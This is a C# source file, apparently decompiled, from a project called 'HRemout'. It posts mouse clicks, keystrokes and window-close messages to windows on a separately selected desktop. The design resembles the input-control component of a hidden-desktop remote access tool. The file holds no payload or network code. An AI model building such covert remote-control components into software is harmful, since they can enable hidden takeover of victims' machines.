using System;
using System.Drawing;
using System.Runtime.InteropServices;
using HRemout.Desktop;

namespace HRemout.ControlWindow;

internal class Control : PrintAllWindow
{
	public enum MapVirtualKeyMapTypes : uint
	{
		MAPVK_VK_TO_VSC,
		MAPVK_VSC_TO_VK,
		MAPVK_VK_TO_CHAR,
		MAPVK_VSC_TO_VK_EX,
		MAPVK_VK_TO_VSC_EX
	}

	private static IntPtr HWND;

	public const int KEYEVENTF_KEYDOWN = 0;

	public const int KEYEVENTF_EXTENDEDKEY = 1;

	public const int KEYEVENTF_KEYUP = 2;

	public const int VK_LCONTROL = 162;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private const int WM_KEYDOWN = 256;

	private const int WM_LBUTTONDOWN = 513;

	private const int WM_LBUTTONUP = 514;

	private const int WM_LBUTTONDBLCLK = 515;

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	internal static extern IntPtr WindowFromPoint(Point p);

	public static IntPtr getAcktiveWindow()
	{
		return GetForegroundWindow();
	}

	[DllImport("user32.dll")]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	public static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

	public static void keyDown(string key)
	{
		DesktopApi.SetThreadDesktop(DesktopApi.Desktop);
		if (HWND != IntPtr.Zero)
		{
			int wParam = Convert.ToInt32(key);
			PostMessage(HWND, 258u, wParam, 0);
		}
	}

	public static void ClipboarDd(string key)
	{
		DesktopApi.SetThreadDesktop(DesktopApi.Desktop);
		_ = HWND != IntPtr.Zero;
	}

	public static void mainWindow(int x, int y, bool WhoClick)
	{
		DesktopApi.SetThreadDesktop(DesktopApi.Desktop);
		IntPtr intPtr = WindowFromPoint(new Point(x, y));
		if (!(intPtr == IntPtr.Zero))
		{
			Rectangle windowPlacement = PrintAllWindow.GetWindowPlacement(intPtr);
			double num = windowPlacement.Left + windowPlacement.Width;
			double num2 = windowPlacement.Top;
			double num3 = 20.0;
			double num4 = 15.0;
			if ((double)x >= num - num3 && (double)x < num && (double)y >= num2 && (double)y < num2 + num4)
			{
				PostMessage(intPtr, 16u, 0, 0);
			}
			HWND = intPtr;
			cordinates(x - windowPlacement.Left, y - windowPlacement.Top, intPtr, WhoClick);
		}
	}

	private static IntPtr CreateLParam(int LoWord, int HiWord)
	{
		return (IntPtr)((HiWord << 16) | (LoWord & 0xFFFF));
	}

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);

	[DllImport("user32.dll")]
	private static extern bool SetForegroundWindow(IntPtr hWnd);

	private static IntPtr MAKELPARAM(int p, int p2)
	{
		return (IntPtr)((p2 << 16) | (p & 0xFFFF));
	}

	public static string cordinates(int x, int y, IntPtr hand, bool WhoClick)
	{
		DesktopApi.SetThreadDesktop(DesktopApi.Desktop);
		SetForegroundWindow(hand);
		MAKELPARAM(x, y);
		MAKELPARAM(x, y);
		if (WhoClick)
		{
			PostMessage(hand, 513u, (IntPtr)1, CreateLParam(x, y));
			PostMessage(hand, 514u, (IntPtr)0, CreateLParam(x, y));
		}
		else
		{
			PostMessage(hand, 515u, (IntPtr)1, CreateLParam(x, y));
		}
		return Convert.ToString(x) + ":" + Convert.ToString(y);
	}
}
